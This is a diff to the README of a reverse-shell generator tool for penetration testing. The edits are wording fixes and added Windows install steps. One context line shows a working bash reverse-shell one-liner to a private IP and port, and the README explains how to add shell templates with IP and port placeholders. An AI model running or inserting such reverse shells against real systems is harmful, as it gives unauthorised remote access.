@@ -7,7 +7,7 @@ A simple yet flexible cross-platform shell generator tool.
 
 Name: G(Great) Shell
 
-Description: A generator that let's you generate whichever shell you want, in any system you want, giving you full-control and automation.
+Description: A cross-platform shell generator tool that lets you generate whichever shell you want, in any system you want, giving you full control and automation.
 
 **If you find this tool helpful, then please give me a ⭐ as it tells me that I should add more features to it.**
 
@@ -83,7 +83,7 @@ shells/reverse_shells.md
 
 These can be one-liners and multi-liners, it doesn't matter. You can even add C# multi-liners code blocks if you want.
 
-Example, replace the IP address and the port placeholders or variables with these placeholders:
+Example, replace the IP address and the port placeholders or variables values with these placeholders in your code:
 
 ```bash
 $ip, $port
@@ -143,7 +143,6 @@ Help Options:
   -l, --list            List the available shell types
   -a, --advice          Print advice and tips to get connections
   -h, --help            Show this help message and exit
-       Show this help message and exit
 ```
 
 Example, generate bash reverse shells:
@@ -171,7 +170,7 @@ bash -i >& /dev/udp/192.168.145.134/444 0>&1
 Clone or download the repository:
 
 ```sh
-git clone  https://github.com/nozerobit/gshell
+git clone https://github.com/nozerobit/gshell
 ```
 
 Install the requirements:
@@ -229,10 +228,16 @@ python -m pip install -r gshell/requirements.txt
 
 > Note: You can change the directory if you want, just make sure that it contains the `gshell` project folder.
 
+Change to the project directory:
+
+```powershell
+cd C:\Tools
+```
+
 Execute the tool:
 
-```sh
-gshell.py
+```powershell
+python gshell.py
 ```
 
 # Contact & Contributing
